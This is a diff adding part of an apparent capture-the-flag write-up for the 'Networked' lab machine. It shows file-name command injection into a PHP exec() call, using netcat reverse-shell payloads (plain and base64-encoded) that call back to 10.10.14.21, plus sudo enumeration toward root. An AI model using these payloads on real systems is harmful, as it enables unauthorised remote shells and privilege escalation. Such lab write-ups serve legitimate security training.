@@ -142,3 +142,82 @@ foreach ($files as $key => $value) {
 
 ?>
 ```
+What we can exploit in this code is the <b>exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");</b>. Since it reads every file in the directory as a parameter then we can create a file that has the name of a command and instead of deleting the file it will run the command for us. There are two ways we can name the file. One is using base64 encoding and another is using the <b>$SHELL</b> variable as a reference to <b>/bin/sh</b>
+
+<b>Base64</b>
+```
+# echo "nc -e /bin/bash 10.10.14.21 10001" | base64
+bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LDIxIDEwMDAxCg==
+
+bash-4.2$ touch test\;base64\ -d\ \<\<\<\ bmMgLWUgL2Jpbi9iYXNoIDEwLjEwLjE0LDIxIDEwMDAxCg\=\=\ \|\ sh\;
+```
+<b>$SHELL</b>
+```
+bash-4.2$ touch test\;nc\ \-e\ \$SHELL\ 10.10.14.21\ 10001\ \|\ sh\;
+```
+After a few minutes you should see a shell open up. If we run <b>whoami</b> you will see that we are now the user <b>guly</b>
+```
+# nc -lvnp 10001
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Listening on :::10001
+Ncat: Listening on 0.0.0.0:10001
+Ncat: Connection from 10.10.10.146.
+Ncat: Connection from 10.10.10.146:52116.
+
+whoami
+guly
+```
+From here you can grab the user flag. Now onto root. If you type <b>sudo -l</b>, it turns out we have <b>sudo</b> rights to run the script <b>/usr/local/sbin/changename.sh</b>
+```
+[guly@networked ~]$ sudo -l
+Matching Defaults entries for guly on networked:
+    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
+    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
+    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
+    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
+    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
+    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
+    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User guly may run the following commands on networked:
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+```
+Running the script shows that it just asks us for a bunch of input.
+```
+[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
+interface NAME:
+test
+interface PROXY_METHOD:
+test
+interface BROWSER_ONLY:
+test
+interface BOOTPROTO:
+test
+ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
+```
+Now lets take a look at the actual file.
+```
+[guly@networked ~]$ cat /usr/local/sbin/changename.sh
+#!/bin/bash -p
+cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
+DEVICE=guly0
+ONBOOT=no
+NM_CONTROLLED=no
+EoF
+
+regexp="^[a-zA-Z0-9_\ /-]+$"
+
+for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
+        echo "interface $var:"
+        read x
+        while [[ ! $x =~ $regexp ]]; do
+                echo "wrong input, try again"
+                echo "interface $var:"
+                read x
+        done
+        echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
+done
+
+/sbin/ifup guly0
+```
+Reading the script there is something that stands out. It writes the input that you give to the program to <b>/etc/sysconfig/network-scripts/ifcfg-guly</b>. Doing a quick google search on how this can be exploited reveals *[this.](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)*
